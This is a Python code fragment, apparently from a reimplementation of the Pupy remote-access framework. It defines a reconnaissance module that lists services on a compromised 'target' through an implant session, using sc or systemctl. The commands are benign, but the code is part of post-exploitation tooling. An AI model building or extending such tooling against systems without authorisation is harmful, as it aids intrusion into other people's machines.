            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }


class ServicesModule(PupyModule):
    """List services on the target.

    Upstream Pupy's ``services`` (via services agent module). Native
    reimplementation using sc/systemctl on the host.
    """

    name = "services"
    version = "1.0.0"
    description = "List services on the target"
    author = "Pupyteer Team"
    category = ModuleCategory.RECON

    async def execute(self, session, args):
        session_mgr = getattr(self, "_session_manager", None)
        os_name = getattr(session, "os", "").lower()

        if "win" in os_name:
            cmd = "sc query type= service state= all 2>nul"
        else:
            cmd = "systemctl list-units --type=service --all 2>/dev/null || service --status-all 2>&1"

        if not session_mgr:
            return {"status": "ok", "mode": "offline", "command": cmd}

        timeout = _command_timeout(args)
        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
        return {
            "status": result.get("status", "ok"),
            "command": cmd,
            "output": result.get("output", ""),
            "error": result.get("error"),
        }
